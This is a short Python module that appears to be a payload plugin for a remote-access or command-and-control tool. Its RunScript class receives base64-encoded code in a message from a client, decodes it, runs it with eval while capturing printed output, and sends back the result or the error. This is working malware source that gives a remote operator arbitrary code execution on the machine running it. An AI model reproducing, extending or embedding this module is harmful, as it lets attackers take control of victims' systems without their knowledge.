import sys

sys.path.append('../../../')

from lib.tool import EZData, Encoder

#[THE CODE ABOVE WILL NOT BE INCLUDED IN PAYLOAD]

import sys
import io

class RunScript:
    def __init__(self):
        pass

    def run_script(self, code: str) -> str:
        old_stdout = sys.stdout
        new_stdout = io.StringIO()
        sys.stdout = new_stdout

        eval(code)

        output = new_stdout.getvalue()
        sys.stdout = old_stdout

        return output

    def run(self, clnt: object, szToken: str, lsMsg: list) -> list:
        if lsMsg[0] == 'code':
            try:
                output = self.run_script(Encoder.b64d2str(lsMsg[1]))
                
                return [
                    'exec',
                    'code',
                    '1',
                    output,
                ]
            

            except Exception as ex:
                return [
                    'exec',
                    'code',
                    '0',
                    str(ex),
                ]

if __name__ == '__main__':
    script = RunScript()
    print(script.run_script('print(\'hello world\')'))